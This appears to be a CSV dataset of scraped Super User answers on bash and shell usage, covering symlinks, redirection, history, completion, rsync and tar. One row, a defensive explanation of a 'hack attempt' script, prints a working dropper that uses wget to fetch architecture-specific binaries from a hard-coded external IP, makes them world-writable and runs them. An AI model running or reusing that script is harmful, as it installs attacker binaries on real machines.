,Link,Title,Text,Code
196,https://superuser.com/questions/303559/,Replace Symbolic Links with Files,"['For some definitions of ""easy"":', 'Run this script with link names as arguments, e.g. through find . -type l -exec /path/tos/script {} +']","[<code>#!/bin/sh
set -e
for link; do
    test -h ""$link"" || continue

    dir=$(dirname ""$link"")
    reltarget=$(readlink ""$link"")
    case $reltarget in
        /*) abstarget=$reltarget;;
        *)  abstarget=$dir/$reltarget;;
    esac

    rm -fv ""$link""
    cp -afv ""$abstarget"" ""$link"" || {
        # on failure, restore the symlink
        rm -rfv ""$link""
        ln -sfv ""$reltarget"" ""$link""
    }
done
</code>, <code>find . -type l -exec /path/tos/script {} +</code>]"
197,https://superuser.com/questions/289539/,Custom bash tab completion,"['Write a bash completion script for cooltool. The bash-completion package comes with scripts for many popular programs, which you can use as examples.']",[<code>cooltool</code>]
198,https://superuser.com/questions/461946/,Can I use pipe output as a shell script argument?,['Command substitution.'],"[<code>./Myscript.sh ""$(cat text.txt)""
</code>]"
199,https://superuser.com/questions/939746/,Pass text to program expecting a file,"['Another solution is to use Process Substitution in Bash. If your system has named pipes, you can use this feature.', 'It is used like this:', 'where list is a sequence of shell commands (actually pipelines; the full details are here). list will be executed, and its output will be connected to the pipe. The name of the pipe is then passed to your program.', 'NOTE: spaces are not allowed between < and (.', ""(The other substitution >(list) also works as you'd expect.)"", 'In your specific case, you could use', ""although you may find @meuh's solution to be more elegant."", 'Update: A great many usage examples are to be found over at the Advanced Bash Scripting Guide.']","[<code>program_expecting_a_file &lt;(list)
</code>, <code>list</code>, <code>list</code>, <code>&lt;</code>, <code>(</code>, <code>&gt;(list)</code>, <code>program_expecting_a_file &lt;(echo ""$your_strings"")
</code>]"
200,https://superuser.com/questions/163515/,bash: how to pass command line arguments containing special characters,"['You can either:', 'EDIT: As some have pointed out, double-quoting does not prevent variable expansion nor command substitution. Therefore if your regex contains something that can be interpreted by bash as one of those, use single quotes instead.']","[<code>\[abc\]_\[x\|y\]</code>, <code>""[abc]_[x|y]""</code>]"
201,https://superuser.com/questions/593694/,"Use ""cd -"" without any output","['Try it like this:', 'You can also do:', 'This will send the output to the ""uselessfile"" file instead of to STDOUT. ', 'You can also append instead of creating or overwriting the file.']","[<code>cd - &gt; /dev/null
</code>, <code>cd - &gt; uselessfile
</code>, <code>cd - &gt;&gt; uselessfile
</code>]"
202,https://superuser.com/questions/1323645/,Unable to change file permissions on Ubuntu Bash for Windows 10,"[""If you're referencing files in the Windows file system, they do not, by default, retain Linux permissions.\nHowever, there's a way to enable that. Edit or create (using sudo) /etc/wsl.conf and add the following:"", 'Shut down all WSL instances and restart an instance, and any chmod changes are now retained.']","[<code>sudo</code>, <code>/etc/wsl.conf</code>, <code>[automount]
options = ""metadata""
</code>, <code>chmod</code>]"
203,https://superuser.com/questions/187106/,Extract/save a mail attachment using bash,"[""If you're aiming for portability, beware that there are several different versions of mail(1) and mailx(1). There's a POSIX mailx command, but with very few requirements. And none of the implementations I have seem to parse attachments anyway."", 'You might have the mpack package. Its munpack command saves all parts of a MIME message into separate files, then all you have to do is save the interesting parts and clean up the rest.', ""There's also metamail. An equivalent of munpack is metamail -wy.""]","[<code>mail(1)</code>, <code>mailx(1)</code>, <code>mailx</code>, <code>munpack</code>, <code>munpack</code>, <code>metamail -wy</code>]"
204,https://superuser.com/questions/168578/,Why must a folder be executable?,"[""Since you can't 'execute' a directory, the execute bit has been put to better use. The execute bit on a directory allows you to access items that are inside the directory, even if you cannot list the directories contents."", 'From the chmod manpage:', 'The letters rwxXst select file mode bits for the affected users: read (r), write (w), execute (or search for directories) (x), execute/search only if the file is a directory or already has execute permission for some user (X), set user or group ID on execution (s), restricted deletion flag or sticky bit (t).']","[<code>$ mkdir -p dir/
$ echo 'Hello World!' &gt; dir/file
$ chmod 000 dir/
$ ls -al dir/
ls: cannot open directory dir: Permission denied
$ cat dir/file
cat: dir/file: Permission denied
$ chmod +x dir/
$ ls -al dir/
ls: cannot open directory dir: Permission denied
$ cat dir/file
Hello World!
</code>, <code>chmod</code>]"
205,https://superuser.com/questions/86184/,Change DNS Server From Terminal (or script) on Mac OS X,"['You can use scutil interactively from the terminal. Run sudo scutil and run these commands, swapping your DNS servers in where appropriate:', 'Instead of using 8.8.8.8 and 9.9.9.9 use your DNS servers.', ""The only problem is this is not persistent across reboots. If you want permanent changes, you'll want ncutil. The reason editing /etc/resolv.conf isn't sufficient in newer versions of OS X is because configd now uses a database to store information of current settings, which other applications read. Certain applications will still read /etc/resolv.conf (host for example), although that is not the case for all applications.""]","[<code>scutil</code>, <code>sudo scutil</code>, <code>8.8.8.8</code>, <code>9.9.9.9</code>, <code>/etc/resolv.conf</code>, <code>/etc/resolv.conf</code>]"
206,https://superuser.com/questions/424774/,Undo tar file extraction mess,"['will list the contents line by line.', ""This can be piped to xargs directly, but beware: do the deletion very carefully. You don't want to just rm -r everything that tar tf tells you, since it might include directories that were not empty before unpacking!"", 'You could do', 'to first remove all files that were in the archive, and then the directories that are left empty.', ""sort -r (glennjackman suggested tac instead of sort -r in the comments to the accepted answer, which also works since tar's output is regular enough) is needed to delete the deepest directories first; otherwise a case where dir1 contains a single empty directory dir2 will leave dir1 after the rmdir pass, since it was not empty before dir2 was removed."", 'This will generate a lot of ', 'and', ""Shut this up with 2>/dev/null if it annoys you, but I'd prefer to keep as much information on the process as possible."", ""And don't do it until you are sure that you match the right files. And perhaps try rm -i to confirm everything. And have backups, eat your breakfast, brush your teeth, etc.""]","[<code>tar tf archive.tar
</code>, <code>xargs</code>, <code>rm -r</code>, <code>tar tf</code>, <code>tar tf archive.tar | xargs -d'\n' rm -v
tar tf archive.tar | sort -r | xargs -d'\n' rmdir -v
</code>, <code>sort -r</code>, <code>tac</code>, <code>sort -r</code>, <code>tar</code>, <code>dir1</code>, <code>dir2</code>, <code>dir1</code>, <code>rmdir</code>, <code>dir2</code>, <code>rm: cannot remove `dir/': Is a directory
</code>, <code>rmdir: failed to remove `dir/': Directory not empty
rmdir: failed to remove `file': Not a directory
</code>, <code>2&gt;/dev/null</code>, <code>rm -i</code>]"
207,https://superuser.com/questions/375223/,"""watch"" the output of a command until a particular string is observed and then exit","['Use a loop:', 'Instead of :, you can use sleep 1 (or 0.2) to ease the CPU.', 'The loop runs until grep finds the string in the command\'s output. -m 1 means ""one match is enough"", i.e. grep stops searching after it finds the first match.', 'You can also use grep -q which also quits after finding the first match, but without printing the matching line.']","[<code>until my_cmd | grep -m 1 ""String Im Looking For""; do : ; done
</code>, <code>:</code>, <code>sleep 1</code>, <code>-m 1</code>, <code>grep -q</code>]"
208,https://superuser.com/questions/1241654/,What does the builtin command do in bash?,"['The builtin command makes sure you run the shell built-in version of the command rather than running another command with the same name. ', ""For example, let's say you defined a shell function named cd to print some extra status everytime you change directories. But you messed it up and now you can't change directories correctly. So now you can type builtin cd ~ to successfully cd back to your home directory without running your broken shell function. "", 'And by the way, my copy of the bash man page has a section called ""SHELL BUILTIN COMMANDS"", and it defines the meaning of the builtin command in that section (transcribed below).']","[<code>builtin</code>, <code>cd</code>, <code>builtin cd ~</code>, <code>builtin</code>]"
209,https://superuser.com/questions/1000867/,A more comfortable way to edit a long $PATH?,"['I use a set of convenience functions for prepending or appending a path to a variable. The functions come in the distribution tarball for Bash in a contrib file called ""pathfuncs"".', 'If you specify a variable as the second argument, it will use that instead of PATH.', 'For convenience, here they are:', 'If you add those to your bash startup file, you can add to your PATH like this:', 'Or specify a different variable:', 'I use this method in my rc files putting the pre_paths first and the add_paths second. It makes all of my path changes easy to understand at a glance. Another benefit is that the lines are short enough that I can add a trailing comment on a line if necessary.', 'And since these are functions, you can use them interactively from the command line, such as by saying add_path $(pwd) to add the current directory to the path.']","[<code># is $1 missing from $2 (or PATH) ?
no_path() {
    eval ""case :\$${2-PATH}: in *:$1:*) return 1;; *) return 0;; esac""
}
# if $1 exists and is not in path, append it
add_path () {
  [ -d ${1:-.} ] &amp;&amp; no_path $* &amp;&amp; eval ${2:-PATH}=""\$${2:-PATH}:$1""
}
# if $1 exists and is not in path, prepend it
pre_path () {
  [ -d ${1:-.} ] &amp;&amp; no_path $* &amp;&amp; eval ${2:-PATH}=""$1:\$${2:-PATH}""
}
# if $1 is in path, remove it
del_path () {
  no_path $* || eval ${2:-PATH}=`eval echo :'$'${2:-PATH}: |
    sed -e ""s;:$1:;:;g"" -e ""s;^:;;"" -e ""s;:\$;;""`
}
</code>, <code>pre_path $HOME/bin
add_path /sbin
add_path /usr/sbin
</code>, <code>pre_path $HOME/man MANPATH
pre_path $HOME/share/man MANPATH
add_path /usr/local/man MANPATH
add_path /usr/share/man MANPATH
</code>, <code>add_path $(pwd)</code>]"
210,https://superuser.com/questions/103069/,Putty SSH: CTRL+Cursor keys don't work skip to previous/next word,"['Add these two lines to your ~/.inputrc file on the destination machine:', 'To make sure that they are the correct sequences, at a Bash prompt, type Ctrl-V Ctrl-LeftArrow and Ctrl-V Ctrl-RightArrow, you should see:', 'When you start a new session, the keys will be available or you can press Ctrl-xCtrl-r to re-read the ~/.inputrc file for the current session.']","[<code>~/.inputrc</code>, <code>""\eOD"": backward-word
""\eOC"": forward-word
</code>, <code>^[OD^[OC
</code>, <code>~/.inputrc</code>]"
211,https://superuser.com/questions/423980/,: colon command for bash,"[': is a shell builtin that is basically equivalent to the true command. It is often used as a no-op eg after an if statement. You can read more about it in this question from stack overflow.', 'The ${varname=value} basically means set the value of $varname to value if $varname is not already set, and then return the value of $varname. Though if you try to run that at the command line it will try to run the value returned. Putting the : in front as a no-op prevents bash from trying to run the value.', 'Note there are two slightly different forms:', 'sets varname to value if varname is either unset or null. ', 'only sets the value of varname if varname is currently unset (i.e., it will not change varname from """" to value)', '(Thank you to chepner for clarifying that in a comment).', 'Someone else referencing this method']","[<code>:</code>, <code>true</code>, <code>if</code>, <code>${varname=value}</code>, <code>$varname</code>, <code>value</code>, <code>$varname</code>, <code>:</code>, <code>${varname:=value}
</code>, <code>${varname=value}
</code>]"
212,https://superuser.com/questions/202645/,How to get the full path of a file in bash?,"['On linux systems, you should have readlink from the GNU coreutils project installed and can do this:', 'Debian/ubuntu systems may have the realpath utility installed which ""provides mostly the same functionality as /bin/readlink -f in the coreutils package.""']","[<code>readlink</code>, <code>readlink -f file.ext
</code>, <code>/bin/readlink -f</code>]"
213,https://superuser.com/questions/537619/,"grep for ""term"" and exclude ""another term""","['To and expressions with grep you need two invocations:', 'If the terms you are searching for are not regular expressions, use fixed string matching (-F) which is faster:']","[<code>grep -Ei ""search term"" | grep -Eiv ""exclude term""
</code>, <code>-F</code>, <code>grep -F ""search term"" | grep -Fv ""exclude term""
</code>]"
214,https://superuser.com/questions/288714/,Bash autocomplete like zsh,"['I use ', 'to achieve it']","[<code>bind 'TAB:menu-complete'
</code>]"
215,https://superuser.com/questions/609564/,Accidentally sourced .bash_history,"[""If it's a local machine, start a new terminal and kill the shell in question."", ""If it's a remote machine, ssh in and kill the shell in question.""]",[]
216,https://superuser.com/questions/39603/,Bash command to cut output after x number of lines,"['Use head:', '10 lines is the default. Read the head man page for more options. ', '(older versions of head also support usage without the explicit -n as in head -15)']","[<code>ls -l | head -n 15
</code>, <code>-n</code>, <code>head -15</code>]"
217,https://superuser.com/questions/82445/,How to upload a file from the command line with FTP or SSH?,['You can use scp to copy to a remote machine.'],"[<code>scp</code>, <code>scp &lt;file to upload&gt; &lt;username&gt;@&lt;hostname&gt;:&lt;destination path&gt;
</code>]"
218,https://superuser.com/questions/347505/,"How do I remove a file in Linux whose name looks like it's ONLY a hyphen, as in ""-""","['This used to be posted in the Usenet FAQs for Unix—I see it is in the GNU Core Utility FAQs.  There were at least five different methods, but this works well:', 'If a filename contains untypeable characters, then use:', 'The -i flag asks for confirmation for each file if it should be removed or not.']","[<code>$ rm ./-
</code>, <code>$ rm -i *
</code>, <code>-i</code>]"
219,https://superuser.com/questions/238791/,Comments in a multi-line bash command,['Put the pipes at the end of line with the comments after it:'],"[<code>$ echo 'foo' |
sed 's/f/a/' | # change first f to a
sed 's/o/b/' | # change first o to b
sed 's/o/c/'   # change second o to c
abc
</code>]"
220,https://superuser.com/questions/735660/,What's the ZSH equivalent of BASH's $PROMPT_COMMAND?,"[""The simplest approach to emulate bash's $PROMPT_COMMAND which comes to my mind is to use the precmd hook, as you already figured out. Define it as"", 'and you can do something like that:', 'Please note the single quotes in that example, otherwise $(date) will get expanded too early, i.e. already when defining $PROMPT_COMMAND and not when called before the prompt.', ""If you want to preserve (and don't want to alter) the existing definition, you can use that approach:"", 'With that the prmptcmd functions is executed after the existing precmd() function.', 'Finally, here is a way which is suitable for use in a program package, which neither should modify user or system files nor can enter the commands interactive.', 'An example to spawn a bash session could be', 'To spawn zsh you can use', ""which causes /program/dir/.zshrc to be sourced. In this file the precmd() hook can be defined as explained above. If you want the user's settings in addition include source $HOME/.zshrc etc. in the program's .zshrc, too.\nThis setup is maintainable, as no files outside the program directory are modified."", 'As a last addition, here is a proof of concept how to keep the newuser welcome, too. Use the following code in your /program/dir/.zshenv rc config file:']","[<code>$PROMPT_COMMAND</code>, <code>precmd</code>, <code>precmd() { eval ""$PROMPT_COMMAND"" }
</code>, <code>$ PROMPT_COMMAND='echo Hello, it is now $(date)'
Hello, it is now Mon, Mar 31, 2014 7:08:00 PM
$ whoami      
user
Hello, it is now Mon, Mar 31, 2014 7:08:21 PM     
$
</code>, <code>$(date)</code>, <code>$PROMPT_COMMAND</code>, <code>$ prmptcmd() { eval ""$PROMPT_COMMAND"" }
$ precmd_functions=(prmptcmd)
</code>, <code>prmptcmd</code>, <code>precmd()</code>, <code>PROMPT_COMMAND=""echo foo"" bash
</code>, <code>ZDOTDIR=/program/dir zsh
</code>, <code>/program/dir/.zshrc</code>, <code>precmd()</code>, <code>source $HOME/.zshrc</code>, <code>/program/dir/.zshenv</code>, <code>echo define precmd, traps, etc.

autoload -Uz zsh-newuser-install

if [[ ! -e ""$HOME/.zshrc"" ]]; then
  zsh-newuser-install -f
  mv $ZDOTDIR/.zshrc $HOME/.zshrc
else
  builtin source $HOME/.zshrc
fi
</code>]"
221,https://superuser.com/questions/295994/,How do I rename files with spaces using the Linux shell?,"[""Escape the space, e.g. Spring\\ 2011, or use quotes, e.g. 'Spring 2011'. In the future, it's typically a bad idea to use file names with spaces in them on any *NIX."", ""If you've got rename, you can use this:""]","[<code>Spring\ 2011</code>, <code>'Spring 2011'</code>, <code>rename</code>, <code>rename ' ' '_' [filenames...]
</code>]"
222,https://superuser.com/questions/719531/,What is the equivalent of bash's !$ and !! in the fish shell?,"['Alt-Up arrow gives you the last argument from the previous command. Subsequent pushes cycle throught prior arguments.', ""I haven't found a satisfactory equivalent to !!, except Up then Ctrl-A""]",[<code>!!</code>]
223,https://superuser.com/questions/105231/,Use rsync to copy all files except for certain filenames with a certain extension,"['This would be significantly easier using rsync with its --exclude switch.', 'The -v switch will provide verbose output on which files are being synchronised.']","[<code>--exclude</code>, <code>rsync -av --exclude='*.FOO' --exclude='*.BAR' --exclude='*.ZIM' /source /dest
</code>, <code>-v</code>]"
224,https://superuser.com/questions/546761/,How do I start in bash when ssh'ing into my server?,"['As a regular user, you can change your default login shell using the chsh command. Here is an example:', 'Another option is to use usermod as root:']","[<code>chsh</code>, <code>chsh -s /bin/bash
</code>, <code>usermod -s /bin/bash username
</code>]"
225,https://superuser.com/questions/543793/,"How can I compare a variable to a text string, rather than integer, in an if/else statement?","['Something like this:', '-eq is for number comparison, use = for string comparison']","[<code>act=""add""
if [[ $act = ""add"" ]]
then
    echo good
else
    echo not good
fi
</code>, <code>-eq</code>, <code>=</code>]"
226,https://superuser.com/questions/382456/,Why does this bash prompt sometimes keep part of previous commands when scrolling history?,['Somewhere your prompt is fubar. What usually happens is that your shell thinks its outputting non-printable term codes and expecting it to take up space.  The best advice I can give you is to systematically add to (or take away from) your prompt until this behavior stops to isolate the code that is causing this issue.'],[]
227,https://superuser.com/questions/335396/,What is the difference between &> and >& in bash?,"['From the bash man page:', 'Read the redirection section of the bash man page.']","[<code>bash man</code>, <code>There  are  two  formats  for  redirecting standard output and standard
   error:

          &amp;&gt;word
   and
          &gt;&amp;word

   Of the two forms, the first is preferred.  This is semantically equiva-
   lent to

          &gt;word 2&gt;&amp;1
</code>, <code>redirection section</code>]"
228,https://superuser.com/questions/419670/,How do I reload .inputrc using a bash script?,"['Use the bind command:', 'See help bind for more information:']","[<code>bind</code>, <code>bind -f ~/.inputrc
</code>, <code>help bind</code>, <code>-f  filename       Read key bindings from FILENAME.
</code>]"
229,https://superuser.com/questions/345376/,How to tar/untar the output on the fly,"['The same -f - option works for tarring as well.', 'GNU tar uses stdio by default:', 'rsync is also popular.']","[<code>-f -</code>, <code>tar -cf - something | tar -C somefolder -xvf -
</code>, <code>tar -c something | tar -C somefolder -xv
</code>, <code>rsync -av something/ somefolder/
</code>]"
230,https://superuser.com/questions/1136409/,What is the 'dot space filename' command doing in bash?,"['The . (""dot"") command is a synonym/shortcut for the shell\'s built-in source command. ', 'It causes the named shell script to be read in and executed within the current shell context (rather than a subshell). This allows the sourced script to modify the environment of the calling shell, such as setting variables and defining shell functions and aliases. ']","[<code>.</code>, <code>source</code>]"
231,https://superuser.com/questions/241018/,How to replace multiple spaces by one tab,"['To convert sequences of more than one space to a tab, but leave individual spaces alone:', 'To do this for a number of files:', 'or', 'or']","[<code>sed 's/ \+ /\t/g' inputfile &gt; outputfile
</code>, <code>for inputfile in *
do
    sed 's/ \+ /\t/g' ""$inputfile"" &gt; tmpfile &amp;&amp; mv tmpfile ""$inputfile""
done
</code>, <code>for inputfile in *
do
    sed -i.bak 's/ \+ /\t/g' ""$inputfile""
done
</code>, <code>find . -type f -exec sed -i.bak 's/ \+ /\t/g' {} \;
</code>]"
232,https://superuser.com/questions/1356359/,What does this bash script do? [Hack Attempt],"['Line by line:', 'Establishes the sh shell, whichever that is, as the shebang line. sh%20/tmp/ks in the request overrides this, so this line is treated as a normal comment and ignored.', ""Declares an arbitrary name, presumably to avoid colliding with other filenames. I'm not sure why they wouldn't just use mktemp, but maybe that is not available on all platforms."", 'Enumerates several common CPU architectures.', 'The server which has the exploit.', 'Tries to change directory to somewhere your web server is likely to be able to create files. I believe SELinux will help with this, by enforcing much stricter rules about what the web server can do than the file system does on its own.', 'For each CPU architecture…', 'Removes previously tried exploit programs. Unnecessary because of the next line, so can be ignored.', 'Copies the current shell executable (/bin/sh). Can be ignored because of the line after next.', 'Makes everyone have full access to the new file. This should have been after the wget command, which is either a sign of a shell scripting newbie or a misdirection technique.', 'Empties out the file. Pointless because of the next line.', 'Overwrites the file with the exploit script for this architecture. -O -> $u could have been written -O - > $u (the hyphen indicates that the download should be written to standard output) which is equivalent to -O $u.', 'Runs the exploit script with the architecture as the first argument.', 'Ends the loop.', 'It looks like this is a trivial exploit attempt script, trying known exploits against various CPU platforms. I do not know why it overwrites $u three times, but those operations could simply be remains from an earlier iteration of the script. Presumably that earlier version had the exploits hard coded rather than dynamically served - the former is easier but almost guarantees that the script will be less effective over time as bugs are patched.']","[<code>#!/bin/sh
</code>, <code>sh</code>, <code>sh%20/tmp/ks</code>, <code>u=""asgknskjdgn""
</code>, <code>mktemp</code>, <code>bin_names=""mmips mipsel arm arm7 powerpc x86_64 x86_32""
</code>, <code>http_server=""80.211.173.159""
http_port=80
</code>, <code>cd /tmp/||cd /var/
</code>, <code>for name in $bin_names
    do
</code>, <code>    rm -rf $u
</code>, <code>    cp $SHELL $u
</code>, <code>/bin/sh</code>, <code>    chmod 777 $u
</code>, <code>wget</code>, <code>    &gt;$u
</code>, <code>    wget http://$http_server:$http_port/$name -O -&gt; $u
</code>, <code>-O -&gt; $u</code>, <code>-O - &gt; $u</code>, <code>-O $u</code>, <code>    ./$u $name
</code>, <code>done
</code>, <code>$u</code>]"
233,https://superuser.com/questions/194529/,Cygwin fatal error unable to remap.. What does it mean?,"['You need to run the rebaseall command from the rebase package to fix the problem.', ""Rebasing is usually only required when installed packages are installed that modify libraries that are dynamically loaded. I'll admit a bad habit of always running rebaseall after installing or upgrading packages in a Cygwin install rather than waiting for that error you hit to show up."", 'As for why you got that error and how rebasing solves the problem, this post has this to say about it:', ""You have it backwards.  Forking doesn't break the relocation.  Relocation\n  breaks forking.  cygwin1.dll needs to have a very special memory layout to\n  implement the fork semantics in Win32.  If this memory layout is disrupted,\n  fork breaks.  Relocating cygwin1.dll disrupts the required memory layout.\n  'rebaseall' does its best to locate all Cygwin DLLs that it knows of\n  into a layout that avoids collisions.  This maintains the required\n  memory layout so fork can do its job.""]","[<code>rebaseall</code>, <code>rebase</code>, <code>rebase</code>, <code>setup.exe</code>, <code>cygwin1.dll</code>, <code>rebaseall</code>, <code>rebaseall</code>]"
234,https://superuser.com/questions/7448/,Can the output of one command be piped to two other commands?,"['It sounds like the tee command will do what you want.', 'The key is to use', 'for process substitution.  With tee, use the following pattern:', 'So if you wanted to use the output of ls as input to two different grep programs, save the output of each grep to different files, and pipe all of the results through less, try:', 'The results of the ls -A will be ""piped"" into both greps.  The file hidden-files will have the contents from the output of the first grep, and normal-files will have the results of the second grep.  All of the files will be shown in the pager less. EDIT: what you see in less is the same exact output of ls -A, not the result of the greps. If you want to modify the output from ls -A to less, (e.g. swapping the order so normal files are listed before hidden ones) then try this:', 'Without >/dev/null, the output of greps would be appended to the output of ls -A instead of replacing it.', 'source']","[<code>tee</code>, <code>&gt;( )
</code>, <code>tee</code>, <code>tee &gt;(proc1) &gt;(proc2) &gt;(proc3) | proc4
</code>, <code>ls</code>, <code>grep</code>, <code>grep</code>, <code>less</code>, <code>ls -A | tee &gt;(grep ^[.] &gt; hidden-files) &gt;(grep -v ^[.] &gt; normal-files) | less
</code>, <code>ls -A</code>, <code>grep</code>, <code>hidden-files</code>, <code>grep</code>, <code>normal-files</code>, <code>grep</code>, <code>less</code>, <code>less</code>, <code>ls -A</code>, <code>grep</code>, <code>ls -A</code>, <code>less</code>, <code>ls -A | tee &gt;(grep ^[.]) &gt;(grep -v ^[.]) &gt;/dev/null | less
</code>, <code>&gt;/dev/null</code>, <code>grep</code>, <code>ls -A</code>]"
235,https://superuser.com/questions/455212/,How to make mouse wheel scroll the less pager using bash and gnome-terminal?,"['The computer where less scrolled had LESS=-r,\nthe other had LESS=-asXFMMRqix8.', 'From the less man page:', '-q or --quiet or --silent\n                Causes  moderately  ""quiet""  operation: the terminal bell is not\n                rung if an attempt is made to scroll past the end of the file or\n                before the beginning of the file.\xa0 If the terminal has a ""visual\n                bell"", it is used instead.\xa0 The bell will  be  rung  on  certain\n                other  errors, such as typing an invalid character.\xa0 The default\n                is to ring the terminal bell in all such cases.', '-X or --no-init\n                Disables sending the termcap initialization and deinitialization\n                strings  to  the  terminal.\xa0  This is sometimes desirable if the\n                deinitialization string does something unnecessary,\n  like  clearing the screen.', 'The -X option prevented scrolling all together and the -q option caused the pager to enter a non-scrollable state when scrolling past the beginning or end of file.', 'My options are now LESS=-asrRix8.']","[<code>less</code>, <code>LESS=-r</code>, <code>LESS=-asXFMMRqix8</code>, <code>less</code>, <code>-q</code>, <code>--quiet</code>, <code>--silent</code>, <code>-X</code>, <code>--no-init</code>, <code>-X</code>, <code>-q</code>, <code>LESS=-asrRix8</code>]"
236,https://superuser.com/questions/940529/,How to change the default shell in Cygwin?,"['The answer depends on how you start Cygwin.', 'If you start Cygwin with Cygwin.bat, modify the last line of /Cygwin.bat (usually C:\\cygwin\\ or C:\\cygwin64\\).', 'If you start Cygwin with mintty, then add the shell as a parameter:  mintty /usr/bin/zsh -']","[<code>/Cygwin.bat</code>, <code>C:\cygwin\</code>, <code>C:\cygwin64\</code>, <code>mintty /usr/bin/zsh -</code>]"
237,https://superuser.com/questions/367275/,Linux: coloring bash prompt will break carriage return,"[""You must wrap all escape sequences between \\[ and \\] in order for 'readline' to correctly calculate the prompt's visible length. Without them, 'readline' thinks the prompt is longer than it is, and doesn't know when the text reaches the margin.""]","[<code>\[</code>, <code>\]</code>]"
238,https://superuser.com/questions/213724/,"Continue a ""ctrl-z""-ed job in background","['bg', 'See also ""JOB CONTROL"" in bash\'s manual page.']","[<code>bg</code>, <code>bash</code>]"
239,https://superuser.com/questions/211966/,How do I keep my bash history across sessions?,"[""Which history? bash-history? If you're losing bash history and you have multiple sessions at a time, it's because each session is overwriting the other sessions' history. "", 'You probably want to tell bash to not overwrite the history each time, but rather to append to it. You can do this by modifying your .bashrc to run shopt -s histappend. ', ""You can also increase the size of your history file by exporting HISTSIZE to be a large-ish number (it's in bytes, so 100000 should be plenty).""]",[<code>shopt -s histappend</code>]
240,https://superuser.com/questions/210846/,How can I get a specific argument from a previous command in bash?,"['In !*, ! is the history expansion prefix, and * is the word designator that means all arguments. You can memorize the general syntax as bang-line-colon-column (!line:column). There are many possible shortcuts: the default line is the previous line, the default column specifier is “all”, and you can leave off the colon if the column specifier is non-numeric (but !3 would mean line 3). You can use !:0 to refer to the command name, !:1, !:2, etc, to refer to successive arguments, !:$ for the last word, !:* for all arguments, and more.', 'See also this post by Michael Mrozek at Unix Stack Exchange.']","[<code>!*</code>, <code>!</code>, <code>*</code>, <code>!</code>, <code>:</code>, <code>!3</code>, <code>!:0</code>, <code>!:1</code>, <code>!:2</code>, <code>!:$</code>, <code>!:*</code>]"
241,https://superuser.com/questions/184047/,Bash/ZSH: Undoing 'disown',"[""Considering how linux jobs and process ownership works, I'm afraid it's not really possible to re-own a process, without help from the adopting process."", ""A parent may 'disown' a child, which is then 'adopted' by the process named 'init'.  System security prevents someone from grabbing someone else's processes.  When you disown it, a process becomes someone else's (init's) to control.  You as the 'user' could still kill the process, but you can't get it back.  Attempting to coerce init to return your process is unlikely to work, as init doesn't even read mail."", 'As mean as it sounds, it really boils down to the answer of ""Don\'t do that!"".']",[]
242,https://superuser.com/questions/59175/,Is there a way to make bash more TAB friendly?,"['To get the ‘cycle through possible completions’ behavior, copy the following into an appropriate place in your .bashrc file:', ""Also, bash-completion provides many extra kinds of completion besides just pathname completion. For example, menu-complete works fine with Git's bash-completion module to complete command names, option names, etc.""]","[<code>[[ $- = *i* ]] &amp;&amp; bind TAB:menu-complete
</code>]"
243,https://superuser.com/questions/179368/,How does Mac's command line compare to Linux?,['Bash is bash so the shell and its built-ins are the same. But be aware that the behavior of some tools like ps or head can differ in the details thus your scripts might fail.'],"[<code>ps</code>, <code>head</code>]"
244,https://superuser.com/questions/387007/,"equivalent ""echo on"" for linux?","['Use bash -v.', 'This is the script:', 'This is the output:', 'Unfortunately, there is no special marker like PS4 for printing expanded commands. You could combine both though to quickly identify commands:']","[<code>bash -v</code>, <code>#!/bin/bash -v

echo ""Hello, World"" | sed 's|Hello|Goodbye|'

echo ""Done.""
</code>, <code>#!/bin/bash -v

echo ""Hello, World"" | sed 's|Hello|Goodbye|'
Goodbye, World

echo ""Done.""
Done.
</code>, <code>PS4</code>, <code>#!/bin/bash -vx

echo ""Hello, World"" | sed 's|Hello|Goodbye|'
+ echo 'Hello, World'
+ sed 's|Hello|Goodbye|'
Goodbye, World

echo ""Done.""
+ echo Done.
Done.
</code>]"
